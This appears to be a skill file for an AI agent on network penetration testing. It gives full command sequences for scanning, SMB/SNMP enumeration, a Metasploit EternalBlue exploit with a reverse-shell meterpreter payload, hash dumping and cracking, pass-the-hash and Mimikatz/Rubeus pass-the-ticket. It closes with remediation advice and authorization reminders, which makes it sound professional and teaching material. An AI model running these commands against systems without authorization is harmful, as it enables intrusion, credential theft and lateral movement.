---
name: network-penetration-testing
description: Professional skills and methodology for network penetration testing
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing is an essential part of assessing the security of network infrastructure. This skill provides methods, tools, and best practices for network penetration testing.

## Testing Scope

### 1. Information Gathering

**Items to check:**
- Network topology
- Host discovery
- Port scanning
- Service identification

### 2. Vulnerability Scanning

**Items to check:**
- System vulnerabilities
- Service vulnerabilities
- Misconfigurations
- Weak passwords

### 3. Exploitation

**Items to check:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information Gathering

### Network Scanning

**Using Nmap:**
```bash
# 主机发现
nmap -sn 192.168.1.0/24

# 端口扫描
nmap -sS -p- 192.168.1.100

# 服务识别
nmap -sV -sC 192.168.1.100

# 操作系统识别
nmap -O 192.168.1.100

# 完整扫描
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# 快速端口扫描
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service Enumeration

**SMB enumeration:**
```bash
# 枚举SMB共享
smbclient -L //192.168.1.100 -N

# 枚举SMB用户
enum4linux -U 192.168.1.100

# 使用nmap脚本
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# 枚举RPC服务
rpcclient -U "" -N 192.168.1.100

# 使用nmap脚本
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP扫描
snmpwalk -v2c -c public 192.168.1.100

# 使用onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### Using Nessus

```bash
# 启动Nessus
# 访问Web界面
# 创建扫描任务
# 分析扫描结果
```

### Using OpenVAS

```bash
# 启动OpenVAS
gvm-setup

# 访问Web界面
# 创建扫描任务
# 分析扫描结果
```

### Using Nmap Scripts

```bash
# 漏洞扫描
nmap --script vuln 192.168.1.100

# 特定漏洞扫描
nmap --script smb-vuln-ms17-010 192.168.1.100

# 所有脚本
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# 启动Metasploit
msfconsole

# 搜索漏洞
search ms17-010

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# 执行
exploit
```

**Post-exploitation:**
```bash
# 获取系统信息
sysinfo

# 获取权限
getsystem

# 迁移进程
migrate <pid>

# 获取哈希
hashdump

# 获取密码
run post/windows/gather/smart_hashdump
```

### Common Exploits

**EternalBlue:**
```bash
# 使用Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# 使用独立工具
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# 使用Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# 使用独立工具
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Password Cracking

**Using Hashcat:**
```bash
# 破解NTLM哈希
hashcat -m 1000 hashes.txt wordlist.txt

# 破解LM哈希
hashcat -m 3000 hashes.txt wordlist.txt

# 使用规则
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Using John:**
```bash
# 破解哈希
john hashes.txt

# 使用字典
john --wordlist=wordlist.txt hashes.txt

# 使用规则
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Using Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Using Mimikatz:**
```bash
# 提取票据
sekurlsa::tickets /export

# 注入票据
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# 请求票据
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# 注入票据
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool Usage

### Nmap

```bash
# 完整扫描
nmap -sS -sV -sC -O -p- -T4 target

# 隐蔽扫描
nmap -sS -T2 -f -D RND:10 target

# UDP扫描
nmap -sU -p- target
```

### Metasploit

```bash
# 启动框架
msfconsole

# 数据库初始化
msfdb init

# 导入扫描结果
db_import nmap.xml

# 查看主机
hosts

# 查看服务
services
```

### Burp Suite

**Network scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Active scanning

## Testing Checklist

### Information Gathering
- [ ] Network topology discovery
- [ ] Host discovery
- [ ] Port scanning
- [ ] Service identification
- [ ] Operating system identification

### Vulnerability Scanning
- [ ] System vulnerability scanning
- [ ] Service vulnerability scanning
- [ ] Misconfiguration checks
- [ ] Weak password checks

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common Security Issues

### 1. Unpatched Systems

**Problem:**
- Systems not updated in a timely manner
- Known vulnerabilities present
- Poor patch management

**Fix:**
- Install patches promptly
- Establish a patch management process
- Apply security updates regularly

### 2. Weak Passwords

**Problem:**
- Default passwords
- Simple passwords
- Password reuse

**Fix:**
- Enforce a strong password policy
- Enable multi-factor authentication
- Change passwords regularly

### 3. Open Ports

**Problem:**
- Unnecessary ports open
- Exposed services
- Firewall misconfigurations

**Fix:**
- Close unnecessary ports
- Implement firewall rules
- Use VPN for access

### 4. Misconfigurations

**Problem:**
- Default configurations
- Excessive privileges
- Improper service configurations

**Fix:**
- Apply secure configuration baselines
- Follow the principle of least privilege
- Conduct regular configuration reviews

## Best Practices

### 1. Information Gathering

- Scan comprehensively
- Verify with multiple tools
- Document findings
- Analyze results

### 2. Exploitation

- Test only with authorization
- Minimize impact
- Document actions
- Clean up promptly

### 3. Report Writing

- Detailed documentation
- Risk ratings
- Remediation recommendations
- Verification steps

## Key Considerations

- Only test in authorized environments
- Avoid impacting production systems
- Comply with laws and regulations
- Protect test data
